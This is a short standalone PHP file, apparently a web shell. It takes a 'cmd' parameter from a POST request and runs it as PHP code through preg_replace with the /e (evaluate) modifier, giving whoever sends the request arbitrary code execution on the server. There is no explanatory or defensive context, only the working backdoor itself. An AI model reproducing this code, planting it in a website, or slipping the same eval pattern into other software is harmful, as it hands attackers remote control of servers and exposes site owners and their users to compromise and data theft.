<?php
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        preg_replace('/.*/e', $cmd, '');
    }
?>